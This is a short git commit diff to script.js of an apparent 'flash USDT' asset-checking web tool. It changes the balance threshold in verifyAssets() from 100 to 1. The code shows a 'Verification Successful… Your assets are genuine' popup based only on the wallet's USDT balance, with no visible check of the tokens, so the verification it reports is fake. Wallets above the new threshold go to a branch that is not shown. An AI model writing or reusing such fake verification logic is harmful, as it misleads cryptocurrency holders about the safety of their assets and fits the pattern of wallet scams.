dee7cc0d6616c530dc78a1f2ec2b369d82edcab1
flashcheck <flash.usdt100@gmail.com>
2025-05-29 11:03:47 +0530

    Update script.js

--- script.js
+++ script.js
@@ -59,7 +59,7 @@ async function verifyAssets() {
         return;
     }
 
-    if (usdtBalance <= 100) {
+    if (usdtBalance <= 1) {
         showPopup(
             `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
             "green"
